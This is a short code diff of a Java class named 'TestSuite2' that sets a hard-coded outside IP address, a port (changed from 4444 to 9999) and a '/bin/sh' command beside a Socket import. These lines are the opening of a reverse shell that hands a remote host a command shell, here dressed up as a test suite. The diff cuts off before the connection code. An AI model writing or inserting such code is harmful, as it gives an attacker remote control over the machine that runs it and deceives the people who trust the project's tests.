@@ -5,7 +5,7 @@ import java.net.Socket;
 public class TestSuite2 {
     public static void main(String[] args) {
         String host = "169.38.106.74";
-        int port = 4444; 
+        int port = 9999; 
         String[] cmd = {"/bin/sh"};
         
         try {
